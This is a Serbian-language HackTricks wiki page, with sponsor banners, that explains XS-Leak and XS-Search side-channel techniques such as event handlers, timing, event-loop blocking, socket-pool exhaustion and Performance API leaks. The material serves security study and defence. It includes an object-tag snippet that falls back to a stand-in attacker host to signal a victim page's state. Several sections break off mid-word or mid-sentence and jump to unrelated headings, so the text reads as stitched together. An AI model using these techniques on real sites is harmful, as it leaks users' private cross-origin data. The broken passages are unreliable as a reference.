# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

XS-Search je metoda koja se koristi za **izvlačenje informacija preko granica izvora** iskorišćavanjem ranjivosti bočnog kanala.

Ključni komponenti uključene u ovaj napad su:

* **Ranjiva veb stranica**: Ciljna veb stranica sa koje se žele izvući informacije.
* **Napadačeva veb stranica**: Zlonamerna veb stranica koju je napadač kreirao, koju žrtva posećuje, a na kojoj se nalazi eksploit.
* **Metod uključivanja**: Tehnika koja se koristi za uključivanje Ranjive veb stranice u Napadačevu veb stranicu (npr. window.open, iframe, fetch, HTML oznaka sa href, itd.).
* **Tehnika curenja**: Tehnike koje se koriste za razlikovanje stanja Ranjive veb stranice na osnovu informacija prikupljenih putem metode uključivanja.
* **Stanja**: Dva moguća stanja Ranjive veb stranice, koja napadač pokušava da razlikuje.
* **Detektovive razlike**: Vidljive varijacije na koje se napadač oslanja kako bi zaključio stanje Ranjive veb stranice.

### Detektovive razlike

Neke aspekte je moguće analizirati kako bi se razlikovala stanja Ranjive veb stranice:

* **Statusni kod**: Razlikovanje između **različitih HTTP statusnih kodova od preko granica izvora**, kao što su greške servera, greške klijenta ili greške autentifikacije.
* **Korišćenje API-ja**: Identifikacija **korišćenja Web API-ja** na različitim stranicama, otkrivajući da li preko granica izvora stranica koristi određeni JavaScript Web API.
* **Preusmeravanja**: Otkrivanje navigacija ka različitim stranicama, ne samo HTTP preusmeravanja već i onih pokrenutih JavaScript-om ili HTML-om.
* **Sadržaj stranice**: Posmatranje **varijacija u telu HTTP odgovora** ili u podresursima stranice, kao što su **broj ugrađenih okvira** ili veličinske razlike u slikama.
* **HTTP zaglavlje**: Uočavanje prisustva ili moguće vrednosti **određenog zaglavlja HTTP odgovora**, uključujući zaglavlja poput X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Vremensko praćenje**: Uočavanje doslednih vremenskih razlika između dva stanja.

### Metode uključivanja

* **HTML elementi**: HTML nudi različite elemente za **uključivanje resursa preko granica izvora**, poput stilskih listova, slika ili skripti, prisiljavajući pregledač da zatraži resurs koji nije HTML. Kompilacija potencijalnih HTML elemenata u tu svrhu može se pronaći na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Okviri**: Elementi poput **iframe**, **object** i **embed** mogu direktno ugraditi HTML resurse u napadačevu stranicu. Ako stranica **nema zaštitu okvira**, JavaScript može pristupiti prozoru ugrađenog resursa putem svojstva contentWindow.
* **Iskačući prozori**: Metoda **`window.open`** otvara resurs u novoj kartici ili prozoru, pružajući JavaScript-u **ručku prozora** za interakciju sa metodama i svojstvima u skladu sa SOP. Iskačući prozori, često korišćeni u jednokratnoj prijavi, zaobilaze ograničenja okvira i kolačića ciljnog resursa. Međutim, moderni pregledači ograničavaju kreiranje iskačućih prozora na određene korisničke radnje.
* **JavaScript zahtevi**: JavaScript omogućava direktno slanje zahteva ciljnim resursima korišćenjem **XMLHttpRequests** ili **Fetch API-ja**. Ove metode omogućavaju preciznu kontrolu nad zahtevom, kao što je opcija praćenja HTTP preusmeravanja.

### Tehnike curenja

* **Rukovalac događajima**: Klasika tehnika curenja u XS-Leaks, gde rukovaoci događajima poput **onload** i **onerror** pružaju informacije o uspehu ili neuspehu učitavanja resursa.
* **Poruke o greškama**: JavaScript izuzeci ili posebne stranice grešaka mogu pružiti informacije o curenju ili razlikovanju između prisustva i odsustva greške.
* **Globalna ograničenja**: Fizička ograničenja pregledača, poput kapaciteta memorije ili drugih nametnutih ograničenja pregledača, mogu signalizirati kada je dostignut prag i služiti kao tehnika curenja.
* **Globalno stanje**: Detektovive interakcije sa **globalnim stanjima pregledača** (npr. interfejs History) mogu biti iskorišćene. Na primer, **broj unosa** u istoriji pregledača može pružiti tragove o stranicama preko granica izvora.
* **Performance API**: Ovaj API pruža **detalje o performansama trenutne stranice**, uključujući vremenske podatke o mreži za dokument i učitane resurse, omogućavajući zaključke o traženim resursima.
* **Čitljivi atributi**: Neki HTML atributi su **čitljivi preko granica izvora** i mogu se koristiti kao tehnika curenja. Na primer, svojstvo `window.frame.length` omogućava JavaScript-u da prebroji ugrađene okvire na veb stranici preko granica izvora.

## XSinator Alat i Rad

XSinator je automatski alat za **proveru pregledača protiv nekoliko poznatih XS-Leakova** objašnjenih u njegovom radu: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Mo
## **Tehnike zasnovane na vremenu**

Neke od sledećih tehnika koriste vreme kao deo procesa za otkrivanje razlika u mogućim stanjima veb stranica. Postoji nekoliko načina za merenje vremena u veb pregledaču.

**Satovi**: API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) omogućava programerima da dobiju merenja visoke rezolucije vremena.\
Postoji značajan broj API-ja koje napadači mogu zloupotrebiti kako bi stvorili implicitne satove: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike događaja

### Onload/Onerror

* **Metode uključivanja**: Okviri, HTML elementi
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Rezime**: Ako se pokušava učitati resurs i onerror/onload događaji se pokreću kada se resurs uspešno/neuspešno učita, moguće je saznati statusni kod.
* **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Primer koda pokušava da **učita objekte skripti iz JS-a**, ali mogu se koristiti i **druge oznake** poput objekata, stilskih listova, slika, zvukova. Takođe, moguće je i direktno ubaciti **oznaku** i deklarisati događaje `onload` i `onerror` unutar oznake (umesto da se ubaci iz JS-a).

Postoji i verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom slučaju, ako `example.com/404` nije pronađen, učitaće se `attacker.com/?error`.

### Vreme učitavanja

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Rezime**: [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** može se koristiti za merenje vremena potrebnog za izvršavanje zahteva. Međutim, mogu se koristiti i druge vrste satova, kao što je [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji može identifikovati zadatke koji traju duže od 50 ms.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) još jedan primer:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Vreme učitavanja + Prisilni težak zadatak

Ova tehnika je slična prethodnoj, ali **napadač** će takođe **prisiliti** neku akciju da traje **relevantno vreme** kada je **odgovor pozitivan ili negativan** i izmeriti to vreme.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Vreme istovarivanja/beforeunload

* **Metode uključivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Rezime**: [SharedArrayBuffer sat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) može se koristiti za merenje vremena potrebnog za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa može se izmeriti korišćenjem događaja [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Događaj **`beforeunload`** se pokreće kada pregledač treba da pređe na novu stranicu, dok se događaj **`unload`** javlja kada se navigacija zaista odvija. Razlika u vremenu između ova dva događaja može se izračunati kako bi se odredilo **vreme koje je pregledač proveo preuzimajući resurs**.

### Vreme merenja okvira sa sandbox-om + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metode uključivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Rezime**: [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API može se koristiti za merenje vremena potrebnog za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Primećeno je da u odsustvu [zaštite od frejmovanja](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za učitavanje stranice i njenih podresursa preko mreže može biti izmereno od strane napadača. Ovo merenje je obično moguće jer se `onload` rukovalac frejma pokreće tek nakon završetka učitavanja resursa i izvršavanja JavaScript koda. Da bi zaobišao varijabilnost koju uvodi izvršavanje skripti, napadač može koristiti atribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) unutar `<iframe>`. Uključivanje ovog atributa ograničava brojne funkcionalnosti, posebno izvršavanje JavaScript koda, čime se olakšava merenje koje je uglavnom pod uticajem performansi mreže.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + greška + onload

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**:
* **Sažetak**: Ako možete da izazovete grešku na stranici kada se pristupi ispravnom sadržaju i da je ispravno učitate kada se pristupi bilo kom sadržaju, tada možete napraviti petlju da izvučete sve informacije bez merenja vremena.
* **Primer koda**:

Pretpostavimo da možete **ubaciti** **stranicu** koja ima **tajni** sadržaj **unutar iframe-a**.

Možete **naterati žrtvu da pretražuje** datoteku koja sadrži "_**flag**_" koristeći **iframe** (iskorišćavanje CSRF-a na primer). U okviru iframe-a znate da će se _**onload događaj**_ uvek **izvršiti barem jednom**. Zatim možete **promeniti** **URL** iframe-a, ali promeniti samo **sadržaj** **hash-a** unutar URL-a.

Na primer:

1. **URL1**: www.napadac.com/xssearch#try1
2. **URL2**: www.napadac.com/xssearch#try2

Ako je prvi URL **uspešno učitan**, tada, kada se **promeni** **hash** dela URL-a, **onload** događaj se **neće ponovo pokrenuti**. Ali **ako** je stranica imala neku vrstu **greške** prilikom **učitavanja**, tada će se **onload** događaj **ponovo pokrenuti**.

Tada možete **razlikovati između** stranice koja je **ispravno** učitana ili stranice koja ima **grešku** prilikom pristupa.

### Izvršenje JavaScript-a

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**:
* **Sažetak**: Ako **stranica** vraća **osetljiv** sadržaj, **ili** sadržaj koji može biti **kontrolisan** od strane korisnika. Korisnik može postaviti **validan JS kod u negativnom slučaju**, i svaki pokušaj učitavanja unutar **`<script>`** oznaka, tako da se u **negativnim** slučajevima izvršava **kod napadača**, a u **pozitivnim** slučajevima **ništa** se ne izvršava.
* **Primer koda**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod i zaglavlja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Sažetak**: **Cross-Origin Read Blocking (CORB)** je sigurnosna mera koja sprečava učitavanje određenih osetljivih resursa sa različitih izvora kako bi se zaštitilo od napada poput **Spectre**. Međutim, napadači mogu iskoristiti njegovo zaštitno ponašanje. Kada odgovor podložan **CORB**-u vrati _**CORB zaštićeni**_ `Content-Type` sa `nosniff` i `2xx` statusnim kodom, **CORB** uklanja telo i zaglavlja odgovora. Napadači koji to posmatraju mogu zaključiti kombinaciju **statusnog koda** (koji ukazuje na uspeh ili grešku) i `Content-Type` (koji označava da li je zaštićen od **CORB**-a), što može dovesti do potencijalnog otkrivanja informacija.
* **Primer koda**:

Pogledajte link za više informacija o napadu.

### onblur

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Sažetak**: Procure osetljivi podaci iz atributa id ili name.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Moguće je **učitati stranicu** unutar **iframe-a** i koristiti **`#id_vrednost`** da bi se stranica **fokusirala na element** iframe-a koji je označen id-om, zatim, ako je **`onblur`** signal pokrenut, ID element postoji.\
Možete izvršiti isti napad sa **`portal`** oznakama.

### postMessage Emitovanja <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metode uključivanja**: Okviri, Iskačući prozori
* **Detektoviva razlika**: Korišćenje API-ja
* **Više informacija**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Sažetak**: Prikupljanje osetljivih informacija iz postMessage ili korišćenje prisustva postMessage-a kao orakula za saznanje o statusu korisnika na stranici
* **Primer koda**: `Bilo koji kod koji sluša sve postMessage-ove.`

Aplikacije često koriste [`postMessage` emitovanja](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju između različitih izvora. Međutim, ovaj metod može nenamerno otkriti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, što omogućava bilo kojem prozoru da primi poruke. Osim toga, sam čin primanja poruke može delovati kao **orakul**; na primer, određene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka može otkriti informacije o stanju ili identitetu korisnika, kao što je da li su autentifikovani ili ne.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Tehnike globalnih ograničenja

### WebSocket API

* **Metode uključivanja**: Okviri, Iskačući prozori
* **Detektoviva razlika**: Korišćenje API-ja
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Sažetak**: Iscrpljivanje ograničenja WebSocket veze otkriva broj WebSocket veza stranice sa različitog izvora.
* **Primer koda**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Moguće je identifikovati da li, i koliko, **WebSocket veza ciljne stranice koristi**. To omogućava napadaču da otkrije stanja aplikacije i procure informacije vezane za broj WebSocket veza.

Ako jedan **izvor** koristi **maksimalan broj WebSocket** objekata, bez obzira na njihovo stanje veze, kreiranje **novih objekata će rezultirati izuzecima JavaScript-a**. Da biste izvršili ovaj napad, web sajt napadača otvara ciljni web sajt u iskačućem prozoru ili
### Payment API

* **Metode uključivanja**: Okviri, iskačući prozori
* **Detektovljiva razlika**: Korišćenje API-ja
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Rezime**: Detektujte zahtev za plaćanje jer samo jedan može biti aktivan u isto vreme.
* **Primer koda**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ova XS-Leak omogućava napadaču da **detektuje kada stranica sa različitog porekla pokreće zahtev za plaćanje**.

Zbog toga što **samo jedan zahtev za plaćanje može biti aktivan** u isto vreme, ako ciljna veb lokacija koristi Payment Request API, svaki **dalji pokušaj korišćenja ovog API-ja će propasti**, izazivajući **JavaScript izuzetak**. Napadač može iskoristiti ovo tako što će **periodično pokušavati da prikaže korisnički interfejs za plaćanje**. Ako jedan pokušaj izazove izuzetak, to znači da ciljna veb lokacija trenutno koristi taj API. Napadač može sakriti ove periodične pokušaje tako što će odmah zatvoriti korisnički interfejs nakon kreiranja.

### Merenje vremena petlje događaja <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metode uključivanja**:
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Rezime**: Merenje vremena izvršavanja veba zloupotrebom jednonitne JS petlje događaja.
* **Primer koda**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript radi na [jednonitnom modelu konkurentnosti petlje događaja](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), što znači da **može izvršavati samo jedan zadatak u isto vreme**. Ova karakteristika može biti iskorišćena kako bi se utvrdilo **koliko vremena kod sa različitog porekla zahteva za izvršavanje**. Napadač može meriti vreme izvršavanja svog sopstvenog koda u petlji događaja tako što kontinuirano šalje događaje sa fiksnim svojstvima. Ovi događaji će biti obrađeni kada je bazen događaja prazan. Ako i druga porekla takođe šalju događaje u isti bazen, **napadač može zaključiti vreme koje je potrebno da se ovi spoljni događaji izvrše posmatrajući kašnjenja u izvršavanju sopstvenih zadataka**. Ovaj metod praćenja petlje događaja za kašnjenja može otkriti vreme izvršavanja koda sa različitih porekla, potencijalno otkrivajući osetljive informacije.

{% hint style="warning" %}
Prilikom merenja vremena izvršavanja moguće je **eliminisati** **mrežne faktore** kako bi se dobile **preciznije merenja**. Na primer, učitavanjem resursa koje koristi stranica pre njenog učitavanja.
{% endhint %}

### Zauzeta petlja događaja <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metode uključivanja**:
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Rezime**: Jedan način merenja vremena izvršavanja veb operacije uključuje namerno blokiranje petlje događaja niti, a zatim merenje **koliko vremena je potrebno da petlja događaja ponovo postane dostupna**. Ubacivanjem blokirajuće operacije (poput dugog računanja ili sinhronog API poziva) u petlju događaja i praćenjem vremena koje je potrebno za izvršavanje sledećeg koda, može se zaključiti trajanje zadataka koji su se izvršavali u petlji događaja tokom blokirajućeg perioda. Ova tehnika se oslanja na jednonitnu prirodu JavaScript-ove petlje događaja, gde se zadaci izvršavaju sekvenčno, i može pružiti uvid u performanse ili ponašanje drugih operacija koje dele istu nit.
* **Primer koda**:

Značajna prednost tehnike merenja vremena izvršavanja zaključavanjem petlje događaja je njena sposobnost da zaobiđe **izolaciju sajta**. **Izolacija sajta** je sigurnosna funkcija koja razdvaja različite veb lokacije u odvojene procese, sa ciljem da spreči zlonamerne sajtove da direktno pristupaju osetljivim podacima drugih sajtova. Međutim, uticajem na vreme izvršavanja druge veb lokacije putem deljene petlje događaja, napadač može indirektno izvući informacije o aktivnostima te veb lokacije. Ova metoda se ne oslanja na direktni pristup podacima druge veb lokacije, već posmatra uticaj aktivnosti te veb lokacije na deljenu petlju događaja, čime izbegava zaštitne barijere koje je uspostavila **izolacija sajta**.

{% hint style="warning" %}
Prilikom merenja vremena izvršavanja moguće je **eliminisati** **mrežne faktore** kako bi se dobile **preciznije merenja**. Na primer, učitavanjem resursa koje koristi stranica pre njenog učitavanja.
{% endhint %}

### Pool konekcija

* **Metode uključivanja**: JavaScript zahtevi
* **Detektovljiva razlika**: Vreme (uglavnom zbog sadržaja stranice, statusnog koda)
* **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Rezime**: Napadač može blokirati sve priključke osim jednog, učitati ciljnu veb stranicu i istovremeno učitati drugu stranicu, vreme do početka učitavanja poslednje stranice je vreme koje je ciljna stranica potrošila na učitavanje.
* **Primer koda**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Pregledači koriste priključke za komunikaciju sa serverom, ali zbog ograničenih resursa operativnog sistema i hardvera, **pregledači su primorani da nametnu ograničenje** na broj istovremenih priključaka. Napadači mogu iskoristiti ovo ograničenje kroz sledeće korake:

1. Utvrditi ograničenje priključaka pregledača, na primer, 256 globalnih priključaka.
2. Zauzeti 255 priključaka tokom produženog perioda pokretanjem 255 zahteva ka različitim hostovima, dizajniranih da održe otvorene veze bez završetka.
3. Koristiti 256. priključak za slanje zahteva ka ciljnoj stranici.
4. Pokušati 257. zahtev ka drugom hostu. S obzirom da su svi priključci zauzeti (kao što je navedeno u koracima 2 i 3), ovaj zahtev će
## Tehnike Performance API-ja

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) pruža uvid u metrike performansi web aplikacija, dodatno obogaćene [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Resource Timing API omogućava praćenje detaljnih vremena mrežnih zahteva, kao što je trajanje zahteva. Posebno, kada serveri uključe zaglavlje `Timing-Allow-Origin: *` u svojim odgovorima, dostupni su dodatni podaci poput veličine prenosa i vremena pretrage domena.

Ova obilje podataka može se dobiti putem metoda poput [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pružajući sveobuhvatan pregled informacija vezanih za performanse. Osim toga, API omogućava merenje vremena izvršavanja tako što računa razliku između vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Međutim, treba napomenuti da za određene operacije u pregledačima poput Chrome-a, preciznost `performance.now()` može biti ograničena na milisekunde, što može uticati na granularnost merenja vremena.

Pored merenja vremena, Performance API se može iskoristiti za sigurnosne uvide. Na primer, prisustvo ili odsustvo stranica u objektu `performance` u Chrome-u može ukazivati na primenu `X-Frame-Options`. Konkretno, ako se stranica blokira od prikazivanja u okviru zbog `X-Frame-Options`, neće biti zabeležena u objektu `performance`, pružajući suptilan trag o politikama okvira stranice.

### Curenje greške

* **Metode uključivanja**: Okviri, HTML elementi
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zahtevi koji rezultiraju greškama neće kreirati unos o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Moguće je **razlikovati HTTP statusne kodove odgovora** jer zahtevi koji dovode do **greške ne stvaraju unos o performansama**.

### Greška ponovnog učitavanja stila

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zbog greške u pregledaču, zahtevi koji rezultiraju greškama se učitavaju dva puta.
* **Primer koda**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici takođe su identifikovana dva slučaja u kojima greške u GC-u dovode do **dvostrukog učitavanja resursa koji ne uspeju da se učitaju**. To će rezultirati višestrukim unosima u Performance API-ju i može se detektovati.

### Greška spajanja zahteva

* **Metode uključivanja**: HTML elementi
* **Detektoviva razlika**: Statusni kod
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Zahtevi koji rezultiraju greškom ne mogu se spojiti.
* **Primer koda**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je pronađena u tabeli u pomenutom radu, ali nije pronađen opis tehnike. Međutim, izvorni kod koji proverava ovu tehniku možete pronaći na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Curenje prazne stranice

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Prazni odgovori ne stvaraju unose o vremenu resursa.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Napadač može da detektuje da li je zahtev rezultirao praznim telom HTTP odgovora jer **prazne stranice ne stvaraju unos o performansama u nekim pregledačima**.

### Curenje XSS-Auditora

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Sadržaj stranice
* **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Rezime**: Korišćenjem XSS Auditora u Security Assertions, napadači mogu detektovati određene elemente veb stranica posmatrajući promene u odgovorima kada izrađeni payloadi pokrenu mehanizam filtriranja auditora.
* **Primer koda**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Security Assertions (SA), XSS Auditor, koji je prvobitno namenjen za sprečavanje XSS napada, paradoksalno može biti iskorišćen za curenje osetljivih informacija. Iako je ova ugrađena funkcionalnost uklonjena iz Google Chrome-a (GC), i dalje je prisutna u SA. Braun i Heiderich su 2013. godine pokazali da XSS Auditor slučajno može blokirati legitimne skripte, što dovodi do lažnih pozitiva. Na osnovu toga, istraživači su razvili tehnike za izvlačenje informacija i detektovanje određenog sadržaja na stranicama preko granica izvora, koncept poznat kao XS-Leaks, koji je inicijalno prijavio Terada, a razradio Heyes u blog postu. Iako su ove tehnike bile specifične za XSS Auditor u GC-u, otkriveno je da u SA, stranice blokirane od strane XSS Auditora ne generišu unose u Performance API-ju, otkrivajući način putem kojeg osetljive informacije i dalje mogu biti curenje.

### Curenje X-Frame

* **Metode uključivanja**: Okviri
* **Detektoviva razlika**: Zaglavlje
